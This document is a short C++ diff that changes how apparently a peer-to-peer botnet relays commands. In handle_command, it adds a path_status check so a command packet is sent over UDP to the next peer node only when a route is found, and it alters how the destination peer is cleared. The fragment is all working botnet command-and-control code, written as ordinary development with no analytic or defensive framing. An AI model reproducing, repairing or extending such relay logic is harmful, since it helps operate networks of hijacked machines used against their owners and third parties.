@@ -133,16 +133,17 @@ static void handle_command(u_char* const data, const struct sockaddr_in& src_add
 		send_command(data, BOTNET_PACK_SIZE);
 	else
 	{
+		bool path_status;
 		command->numerics.id = botnet_topology.fowardCommand(command->numerics.id, src_addr);
-		struct sockaddr_in next_peer = botnet_topology.nextPathNode(command->dst_peer, command->private_peer);
+		struct sockaddr_in next_peer = botnet_topology.nextPathNode(command->dst_peer, command->private_peer, &path_status);
 		
-		if (next_peer.sin_addr.s_addr == command->dst_peer.ip && next_peer.sin_port == command->dst_peer.port)
+		if (path_status)
 		{
-			command->dst_peer = { 0, 0 };
-			command->private_peer = { 0, 0 };
-		}
+			if (next_peer.sin_addr.s_addr == command->dst_peer.ip && next_peer.sin_port == command->dst_peer.port)
+				command->dst_peer = { 0, 0 };
 
-		sendto(udp_sock, (char*)data, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&next_peer, sizeof(next_peer));
+			sendto(udp_sock, (char*)data, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&next_peer, sizeof(next_peer));
+		}
 	}
 }
 
